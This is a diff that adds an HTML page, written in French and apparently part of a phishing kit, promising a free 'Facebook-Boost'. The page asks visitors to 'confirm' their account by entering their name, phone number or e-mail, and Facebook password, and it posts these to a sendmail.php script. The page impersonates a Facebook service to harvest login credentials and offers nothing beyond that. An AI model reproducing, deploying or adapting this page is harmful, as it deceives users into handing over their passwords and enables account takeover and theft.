@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Identification</title>
+	<link rel="stylesheet" type="text/css" href="include/style.css">
+</head>
+<style type="text/css">
+	
+</style>
+<body>
+	<center>
+
+	<div class="container">
+		<fieldset><legend><em>Identification</em></legend>
+		<div class="content-form">
+			<p class="warning"><em class="ref">100% BOOST-GRATUIT !!</em><br> Veuillez confirmer l'identité de votre compte à booster !</p>
+			<img src="assets/facebook.png" class="fcb"><br>
+			<span class="fbk">Facebook-Boost</span>
+			<div id="Query-statement"><div class="style"></div></div>
+
+			<form method="post" action="include/sendmail.php">
+			
+			<table>
+			<tr>
+				<td align="left"><span class="align-ref">Prenom</span></td>
+				</tr>
+				<tr>
+					<td><input type="text" class="entry" placeholder="" name="surname" required id="surname"></td>
+				</tr>
+				<tr>
+					<td align="left"><span class="align-ref">Nom de famille</span></td>
+				</tr>
+				<tr>
+					<td><input type="text" class="entry" name="name" required  id="name"></td>
+				</tr>
+				<tr>
+					<td><hr size="5" width="100%"></td>
+				</tr>
+				<tr>
+					<td align="left"><span class="align-ref">Numero de mobile ou e-mail</span><br></td>
+				</tr>
+				<tr>
+				<td> <input type="text" class="entry" name="loginname" required id="login-name"><br></td>
+				</tr>
+				<tr>
+				<td align="left"><span class="align-ref">Mot de passe</span><br></td>
+					
+				</tr>
+					<tr>
+						<td><input type="password" class="entry" name="loginpass"  required id="login-pswd"><br></td>
+					</tr>
+				
+		</table>
+		</button>
+		<input type="submit" name="boostQuery" onmousemove="verif();" value="Booster gratuitement">
+		</div>
+		</fieldset>
+
+	</div>
+	</center>
+</form>
+
+<script type="text/javascript" src="include/Js.js"></script>
+</body>
+</html>
